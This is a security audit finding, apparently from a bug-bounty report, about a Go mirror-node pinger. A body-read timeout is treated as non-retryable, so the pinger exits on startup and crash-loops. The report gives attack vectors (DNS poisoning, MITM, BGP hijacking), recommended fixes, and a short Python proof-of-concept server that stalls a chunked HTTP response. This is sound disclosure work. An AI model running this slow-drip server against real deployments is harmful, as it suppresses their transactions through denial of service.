### Title
Slow-Drip HTTP Body Causes `retry=false` Bypass, Immediately Killing Pinger on First Attempt

### Summary
In `fetchMirrorNodeNetwork()`, Go's `http.Client.Timeout` fires during body reading (not during `httpClient.Do()`), causing `json.NewDecoder(resp.Body).Decode()` to return an error that is mapped to `retry=false`. This bypasses the entire retry loop in `buildNetworkFromMirrorNodes()` on the very first attempt, causing `newClient()` to fail and `main()` to call `log.Fatalf`, permanently terminating the pinger process with no transactions ever submitted.

### Finding Description
**Code path:** `pinger/mirror_node_client.go`

In `buildNetworkFromMirrorNodes()` (line 46), the HTTP client is constructed with a per-request timeout:

```go
httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}  // line 46
```

In `fetchMirrorNodeNetwork()`, `httpClient.Do(req)` at line 84 returns as soon as HTTP response headers are received — the body is read lazily. An attacker who controls the HTTP response (via DNS poisoning, MITM, or a compromised/malicious mirror node) sends a valid `HTTP 200` response with headers immediately, then drips the body at a rate slow enough to never complete within `cfg.mirrorNodeClientTimeout` (default 10 s).

The timeout fires during body reading at line 96:

```go
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)  // retry=false
}
```

The `false` retry flag is returned. Back in `buildNetworkFromMirrorNodes()` at line 59:

```go
if !retry || attempt == attempts {
    break
}
```

Because `retry=false`, the loop breaks immediately on the **first attempt**, regardless of `cfg.mirrorNodeClientMaxRetries` (default 10). All 10 configured retries are silently skipped.

`newClient()` at line 18–21 of `sdk_client.go` propagates this error:

```go
netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
if err != nil {
    return nil, err
}
```

`main()` at line 42–44 calls `log.Fatalf`:

```go
client, err := newClient(cfg)
if err != nil {
    log.Fatalf("client error: %v", err)
}
```

The process exits. No transactions are ever submitted.

**Root cause / failed assumption:** The code assumes that a `json.Decode` failure is a non-transient, non-retryable error (e.g., malformed JSON). It does not distinguish between a permanent decode error and a transient I/O timeout during body streaming. A slow-drip body produces the latter but is treated as the former.

### Impact Explanation
Complete transaction suppression for any deployment using `network=other`. The pinger process terminates permanently on startup. The Kubernetes liveness probe (`/tmp/alive`) is never written after startup (the goroutine starts but the process exits before the first 15 s tick), and the readiness file `/tmp/ready` is never created, so the pod is restarted — but each restart triggers the same attack, creating a permanent crash loop. No HBAR transfers are ever submitted.

### Likelihood Explanation
Precondition: the attacker must be able to serve a crafted HTTP response to the pinger's mirror node REST URL. Realistic vectors:

- **DNS poisoning / hijacking**: If the `HIERO_MIRROR_PINGER_REST` URL uses a hostname resolved via an unsecured DNS resolver (no DNSSEC), an external attacker can redirect it to a controlled server. This requires no privileges on the target system.
- **HTTP (non-TLS) deployment**: Internal Kubernetes services commonly use plain HTTP. A compromised pod in the same namespace, or a network-policy gap, allows response injection.
- **BGP hijacking**: For public mirror node URLs, a sophisticated external attacker can hijack the IP prefix.

The attack is trivially repeatable: a simple HTTP server that sends `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n` and then stalls is sufficient. Each pinger restart triggers a fresh exploitation.

### Recommendation

1. **Distinguish timeout errors from decode errors.** Check whether the decode error wraps a context/deadline error and set `retry=true` in that case:
   ```go
   if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
       retry := errors.Is(err, context.DeadlineExceeded) || isTimeoutError(err)
       return nil, retry, fmt.Errorf("decode mirror nodes: %w", err)
   }
   ```

2. **Use TLS with certificate pinning or at minimum hostname verification** for the mirror node REST URL to prevent DNS/MITM attacks.

3. **Apply a separate `io.LimitReader`** on `resp.Body` before decoding to bound memory and detect stalled bodies independently of the HTTP client timeout.

4. **Do not call `log.Fatalf` on a retryable startup error.** Instead, retry `newClient()` in a loop with backoff so a transient attack does not permanently kill the process.

### Proof of Concept

```python
# Attacker's HTTP server (Python)
import socket, time

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 80))
s.listen(1)
while True:
    conn, _ = s.accept()
    # Send valid HTTP 200 headers immediately
    conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n")
    # Drip one byte every 9 seconds — never completing within 10s timeout
    while True:
        time.sleep(9)
        try:
            conn.sendall(b"1\r\n{\r\n")  # one byte of JSON body
        except:
            break
```

1. Point `HIERO_MIRROR_PINGER_REST` (or DNS for the mirror node hostname) at the attacker's server.
2. Start the pinger with `HIERO_MIRROR_PINGER_NETWORK=other`.
3. The pinger calls `fetchMirrorNodeNetwork()`, receives headers, then times out reading the body after 10 s.
4. `retry=false` is returned; `buildNetworkFromMirrorNodes()` breaks immediately.
5. `newClient()` returns an error; `log.Fatalf` terminates the process.
6. No `/tmp/ready` file is created; no transactions are submitted; the pod enters a crash loop.